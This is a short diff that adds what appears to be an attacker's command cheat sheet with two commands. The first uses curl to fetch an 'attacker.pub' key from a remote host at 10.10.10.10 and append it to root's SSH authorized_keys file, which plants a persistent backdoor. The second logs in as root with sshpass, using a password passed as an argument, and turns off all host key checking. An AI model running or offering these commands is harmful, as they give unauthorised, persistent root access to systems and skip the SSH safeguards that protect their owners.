@@ -1,0 +1,10 @@
+
+
+
+
+Add public key to autherized keys from web server response:
+curl 10.10.10.10/attacker.pub >>  /root/.ssh/authorized_keys
+
+
+start ssh with password and server from variable, with clean slate:
+sshpass -p $2 ssh -o GlobalKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@$1
